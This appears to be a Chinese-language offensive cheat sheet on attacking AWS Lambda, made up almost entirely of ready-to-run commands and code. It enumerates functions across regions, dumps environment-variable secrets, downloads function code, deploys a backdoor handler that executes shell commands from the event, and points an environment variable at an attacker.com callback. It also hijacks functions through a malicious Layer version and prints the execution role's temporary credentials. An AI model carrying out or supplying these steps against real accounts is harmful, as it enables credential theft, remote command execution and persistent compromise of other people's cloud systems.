# AWS Lambda 攻击详解

## 发现函数

```bash
aws lambda list-functions --region us-east-1
# 遍历所有 region
for r in us-east-1 us-west-2 eu-west-1 ap-northeast-1 ap-southeast-1; do
  echo "=== $r ===" && aws lambda list-functions --region $r --query 'Functions[].FunctionName' 2>/dev/null
done
```

## 获取函数详情

```bash
aws lambda get-function --function-name FUNC_NAME
aws lambda get-function-configuration --function-name FUNC_NAME
```

## 环境变量提取

```bash
aws lambda get-function-configuration --function-name FUNC_NAME \
  --query 'Environment.Variables' --output json
# 常见敏感变量名：
# DB_PASSWORD, DATABASE_URL, MONGODB_URI
# AWS_ACCESS_KEY_ID（嵌套凭据）
# SECRET_KEY, JWT_SECRET, API_KEY
# REDIS_URL, SMTP_PASSWORD
```

## 下载代码

```bash
CODE_URL=$(aws lambda get-function --function-name FUNC_NAME \
  --query 'Code.Location' --output text)
curl -o lambda_code.zip "$CODE_URL"
unzip lambda_code.zip -d lambda_code/
```

## 代码注入/覆盖

```bash
# 用恶意代码替换函数（需要 UpdateFunctionCode 权限）
cat > /tmp/lambda_backdoor.py << 'EOF'
import os, json
def lambda_handler(event, context):
    cmd = event.get('cmd', 'id')
    output = os.popen(cmd).read()
    return {'statusCode': 200, 'body': json.dumps({'output': output})}
EOF
cd /tmp && zip lambda_backdoor.zip lambda_backdoor.py
aws lambda update-function-code --function-name FUNC_NAME \
  --zip-file fileb:///tmp/lambda_backdoor.zip
```

## 修改环境变量

```bash
aws lambda update-function-configuration --function-name FUNC_NAME \
  --environment '{"Variables":{"BACKDOOR_URL":"http://attacker.com/callback"}}'
```

## Layer 劫持

Lambda Layer version 是不可变快照；发布同名 Layer 只会创建新版本，不会自动影响仍绑定旧版本 ARN 的函数。要投毒目标函数，需要发布新 Layer version 后更新函数配置指向该版本。

```bash
# 列出函数使用的 Layers
aws lambda get-function-configuration --function-name FUNC_NAME --query 'Layers'

# 发布恶意 Layer 新版本（替换依赖库）
LAYER_ARN=$(aws lambda publish-layer-version --layer-name shared-lib \
  --zip-file fileb://malicious_layer.zip \
  --query 'LayerVersionArn' --output text)

# 将目标函数更新到新的 Layer version
aws lambda update-function-configuration --function-name FUNC_NAME \
  --layers "$LAYER_ARN"
```

## 临时凭据提取

每个 Lambda 运行时都有临时凭据（来自函数的执行角色）：

```python
import os
print(os.environ.get('AWS_ACCESS_KEY_ID'))
print(os.environ.get('AWS_SECRET_ACCESS_KEY'))
print(os.environ.get('AWS_SESSION_TOKEN'))
```

这些凭据的权限就是函数执行角色的权限——可能比泄露的 AK/SK 权限更高。
